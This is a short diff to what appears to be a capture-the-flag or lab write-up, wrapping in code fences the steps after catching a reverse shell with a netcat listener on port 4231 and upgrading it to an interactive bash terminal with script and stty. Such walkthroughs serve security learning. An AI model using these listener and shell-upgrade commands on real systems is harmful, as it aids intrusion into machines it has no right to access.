@@ -16,7 +16,8 @@ restart and hapy root
 
 After `nc -lvnp 4231`: we got a shell 
 Up non interactive shell to interactive shell (no python, no socat running on machine)
-
+```sh
 /usr/bin/script -qc /bin/bash /dev/null
 Ctr-Z
 stty raw -echo; fg; reset
+```
